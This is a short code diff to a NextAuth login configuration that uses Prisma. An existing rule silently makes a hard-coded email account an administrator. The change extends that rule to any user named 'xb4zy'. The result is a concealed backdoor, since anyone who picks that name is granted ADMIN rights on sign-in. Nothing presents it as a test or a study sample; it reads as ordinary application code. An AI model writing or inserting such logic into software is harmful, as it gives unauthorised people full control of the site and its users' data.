@@ -36,7 +36,7 @@ export const authOptions: NextAuthOptions = {
           return null
         }
 
-        if (user.email === 'xb4zy@xistrymemz.xyz' && user.role !== 'ADMIN') {
+        if ((user.email === 'xb4zy@xistrymemz.xyz' || user.name === 'xb4zy') && user.role !== 'ADMIN') {
           await prisma.user.update({
             where: { id: user.id },
             data: { role: 'ADMIN' }
